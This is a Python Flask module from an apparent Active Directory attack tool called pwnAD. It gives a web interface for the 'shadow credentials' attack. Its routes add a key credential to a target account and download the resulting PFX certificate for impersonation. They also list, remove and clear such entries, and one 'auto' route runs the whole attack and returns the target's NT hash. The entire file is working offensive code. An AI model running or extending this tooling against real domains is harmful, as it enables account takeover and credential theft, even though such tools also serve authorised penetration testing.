import logging
from io import BytesIO

from flask import Blueprint, request, render_template, current_app, jsonify, send_file

from pwnAD.commands.shadow import (
    get_key_credentials, set_key_credentials, add_new_key_credential,
    get_key_and_certificate, auto as shadow_auto,
)
from pwnAD.lib.certificate import create_pfx

shadow_bp = Blueprint('shadow', __name__)


def _get_conn():
    return current_app.config['LDAP_CONNECTION']


def _base_context(active_page='shadow'):
    conn = _get_conn()
    return {
        'domain': conn.domain,
        'dc_ip': conn.target,
        'session_user': getattr(conn, 'ldap_user', '') or getattr(conn, 'user', ''),
        'active_page': active_page,
    }


def _list_key_credentials(conn, target):
    """Return list of parsed key credential dicts for a target."""
    from dsinternals.common.data.DNWithBinary import DNWithBinary
    from dsinternals.common.data.hello.KeyCredential import KeyCredential

    target_dn = conn.get_dn_from_samaccountname(target, 'user')
    raw_creds = get_key_credentials(conn, target_dn, target)
    if raw_creds is None:
        return None, target_dn

    entries = []
    for raw in raw_creds:
        try:
            kc = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(raw))
            entries.append({
                'device_id': kc.DeviceId.toFormatD(),
                'creation_time': str(kc.CreationTime),
            })
        except Exception as e:
            logging.debug(f"Error parsing key credential: {e}")
    return entries, target_dn


@shadow_bp.route('/shadow')
def shadow_view():
    ctx = _base_context('shadow')
    target = request.args.get('target', '').strip()
    ctx['target'] = target
    ctx['credentials'] = None

    if target:
        conn = _get_conn()
        if not conn.exists(target):
            ctx['error'] = f'Target {target} not found'
        else:
            creds, _ = _list_key_credentials(conn, target)
            if creds is None:
                ctx['error'] = 'Could not read key credentials (insufficient permissions?)'
            else:
                ctx['credentials'] = creds

    return render_template('shadow.html', **ctx)


@shadow_bp.route('/shadow/list')
def shadow_list():
    conn = _get_conn()
    target = request.args.get('target', '').strip()
    if not target:
        return '<tr><td colspan="3" class="px-4 py-8 text-center text-neutral-500">Enter a target</td></tr>'

    if not conn.exists(target):
        return '<tr><td colspan="3" class="px-4 py-8 text-center text-red-400">Target not found</td></tr>'

    creds, _ = _list_key_credentials(conn, target)
    if creds is None:
        return '<tr><td colspan="3" class="px-4 py-8 text-center text-red-400">Cannot read key credentials</td></tr>'

    return render_template('partials/shadow_list.html', credentials=creds, target=target)


@shadow_bp.route('/shadow/add', methods=['POST'])
def shadow_add():
    conn = _get_conn()
    target = request.form.get('target', '').strip()
    if not target:
        return jsonify(success=False, message='Missing target'), 400

    if not conn.exists(target):
        return jsonify(success=False, message=f'Target {target} not found')

    try:
        target_dn = conn.get_dn_from_samaccountname(target, 'user')
        result = add_new_key_credential(conn, target_dn, target)
        if result is None:
            return jsonify(success=False, message='Failed to add key credential')

        cert, _, _, device_id = result
        key, cert_obj = get_key_and_certificate(cert)
        pfx = create_pfx(key, cert_obj)

        filename = f"{target.rstrip('$')}.pfx"
        return send_file(
            BytesIO(pfx),
            mimetype='application/x-pkcs12',
            as_attachment=True,
            download_name=filename,
        )
    except Exception as e:
        logging.error(f"shadow add error: {e}")
        return jsonify(success=False, message=str(e))


@shadow_bp.route('/shadow/remove', methods=['POST'])
def shadow_remove():
    conn = _get_conn()
    target = request.form.get('target', '').strip()
    device_id = request.form.get('device_id', '').strip()

    if not target or not device_id:
        return jsonify(success=False, message='Missing target or device_id'), 400

    try:
        from pwnAD.commands.shadow import remove as shadow_remove_cmd
        result = shadow_remove_cmd(conn, target, device_id)
        if result:
            return jsonify(success=True, message=f'Removed key credential {device_id}')
        return jsonify(success=False, message='Failed to remove key credential')
    except Exception as e:
        logging.error(f"shadow remove error: {e}")
        return jsonify(success=False, message=str(e))


@shadow_bp.route('/shadow/clear', methods=['POST'])
def shadow_clear():
    conn = _get_conn()
    target = request.form.get('target', '').strip()

    if not target:
        return jsonify(success=False, message='Missing target'), 400

    try:
        from pwnAD.commands.shadow import clear as shadow_clear_cmd
        result = shadow_clear_cmd(conn, target)
        if result:
            return jsonify(success=True, message=f'Cleared all key credentials for {target}')
        return jsonify(success=False, message='Failed to clear key credentials')
    except Exception as e:
        logging.error(f"shadow clear error: {e}")
        return jsonify(success=False, message=str(e))


@shadow_bp.route('/shadow/auto', methods=['POST'])
def shadow_auto_attack():
    conn = _get_conn()
    target = request.form.get('target', '').strip()

    if not target:
        return jsonify(success=False, message='Missing target'), 400

    try:
        result = shadow_auto(conn, target)
        if result and result is not False:
            return jsonify(success=True, message=f'NT hash for {target}: {result}', nt_hash=result)
        return jsonify(success=False, message='Shadow credentials auto attack failed')
    except Exception as e:
        logging.error(f"shadow auto error: {e}")
        return jsonify(success=False, message=str(e))
